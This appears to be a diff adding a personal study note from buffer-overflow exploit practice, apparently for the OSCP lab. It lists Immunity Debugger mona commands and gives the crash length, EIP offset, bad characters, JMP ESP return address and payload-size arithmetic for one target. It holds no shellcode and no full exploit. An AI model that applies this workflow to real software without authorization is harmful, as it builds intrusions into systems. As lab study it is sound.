@@ -1,0 +1,48 @@
+!mona commands:
+
+1. !mona config -set workingfolder c:\mona\%p
+
+2. !mona findmsp -distance 600
+
+3. !mona bytearray -b "\x00"
+
+4. !mona compare -f C:\mona\oscp\bytearray.bin -a <address>
+
+5. !mona bytearray -b "\x00\xbadchar"
+
+6. !mona jmp -r esp -cpb "\x00"
+
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
+
+at 2000 byte --> crashed
+
+payload made --> 2400 byte
+
+offset --> 1978
+
+shellcode --> 351 byte
+
+
+Address	          Status                   BadChars
+0x0182fa30  Corruption after 6 bytes   00 07 08 2e 2f a0 a1 
+				       => \x00\x07\x08\x2e\x2f\xa0\xa1
+ Type	    Location
+ normal      Stack
+
+
+ret addr: 0x625011D3  => LSB --> \xD3\x11\x50\x62
+
+
+payload = 
+
+prefix + 1978 + 4 + 16 + 351 ---> 2349 + prefix --> 2349 + 10 --> 2359  (<= 2400)
+
+______________________________________________________________________
+
+
+at 2000 byte --> crashed
+
+payload made --> 2000 byte    -----> If it was taken, making payload would be difficult
+
+offset --> 1978
+
